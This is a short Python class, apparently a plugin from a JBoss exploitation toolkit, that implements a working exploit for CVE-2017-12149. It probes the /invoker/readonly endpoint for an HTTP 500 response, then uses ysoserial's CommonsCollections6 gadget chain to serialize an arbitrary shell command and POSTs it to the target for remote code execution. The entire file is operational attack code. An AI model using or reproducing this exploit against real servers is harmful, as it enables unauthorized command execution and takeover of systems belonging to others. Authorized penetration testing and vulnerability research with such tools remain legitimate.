import requests
from plugins.jbosslib.Runtime_payload import Runtime_payload
import os
import re

class CVE_2017_12149():
    url = ""
    ysoserial_path = ""
    payload_type = ""

    def __init__(self,url,ysoserial_path,cmd="",payload_type="CommonsCollections6"):
        self.url = url + "/invoker/readonly"
        self.ysoserial_path = ysoserial_path
        self.cmd = cmd
        self.payload_type = payload_type

    def check(self):
        res = requests.get(url=self.url)
        if res.status_code == 500:
            return True
        else:
            return False

    def execmd(self,cmd):
        cmd = Runtime_payload.shell_encode(cmd)
        exe = 'java -jar ' + self.ysoserial_path + ' ' + self.payload_type + ' ' + '"' + cmd + '" > cve_2017_12149.ser'
        if os.system(exe) == 0:
            with open('cve_2017_12149.ser','rb') as f:
                try:
                    res = requests.post(url=self.url,data=f)
                    return True
                except:
                    return False
        else:
            return False



